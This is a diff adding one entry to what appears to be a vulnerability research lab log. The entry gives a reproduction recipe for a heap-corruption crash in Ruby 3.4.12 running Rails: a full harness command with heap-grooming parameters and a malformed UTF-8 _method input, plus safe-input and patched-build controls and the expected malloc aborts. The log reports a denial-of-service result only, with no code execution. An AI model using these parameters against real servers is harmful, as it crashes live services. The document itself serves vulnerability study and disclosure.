@@ -17347,3 +17347,35 @@ Controls: vulnerable trigger with source-EID length 8 lands at the natural
 `0x7ffff0001200`; fixed 0.15.2 ASan follows its natural layout with zero
 hits. No callable pointer, indirect call, command side effect or witness
 replay; R5 stays UNKNOWN.
+
+### W313 — Rails production no-mtrace control pair (Ruby, §03:5xZ)
+
+From the repository root, 12 fresh loopback `rails new` processes per
+arm at port base 4810, plain 3.4.12 unless stated, `RACK_ENV=production`,
+`RUBY2SHELL_CLAIM_NO_MTRACE=1` (no tracer reaches the server). All three
+arms use the same forged plant/claim bodies; regenerate the gitignored
+raw logs with:
+
+    # attack: 1 'a' + 967 ß in _method, no tracer in server environment
+    RACK_ENV=production RUBY2SHELL_CLAIM_STACK=rails \
+      RUBY2SHELL_CLAIM_MODE=poison RUBY2SHELL_CLAIM_N=972 \
+      RUBY2SHELL_CLAIM_TAG=w313rails400 RUBY2SHELL_CLAIM_DRAIN=984x7 \
+      RUBY2SHELL_CLAIM_PLANT=1000x6 FILLER_SPEC=1x1200 \
+      RUBY2SHELL_CLAIM_PARTS='1024@0x400:0x414,1015' \
+      RUBY2SHELL_CLAIM_COUNT=12 RUBY2SHELL_CLAIM_NO_MTRACE=1 \
+      POISON_GROWN=0x450 POISON_NEXT=0x90 \
+      bash lab/repro/ruby2shell-shrink-claim.sh
+
+    # safe input: same length, all-ASCII _method — add
+    # METHOD_LEAD_A=968 and RUBY2SHELL_CLAIM_TAG=w313rails400safe
+
+    # fixed build: identical attack wire, patched 3.4.13 with the
+    # default 3.4.12 GEM_PATH — add
+    # RUBY2SHELL_CLAIM_RB=lab/build/plain/ruby-3.4.13-plain/bin/ruby and
+    # RUBY2SHELL_CLAIM_TAG=w313rails400fixed
+
+Expect attack 12/12 abort on the attack POST (10 `malloc(): invalid
+next size (unsorted)`, 2 `malloc(): mismatching
+next->prev_size (unsorted)`), safe 12/12 and fixed 12/12 all six
+requests 404 with `up=200 alive=YES` and no abort line. Grade unchanged;
+availability only, no command and no surviving process.
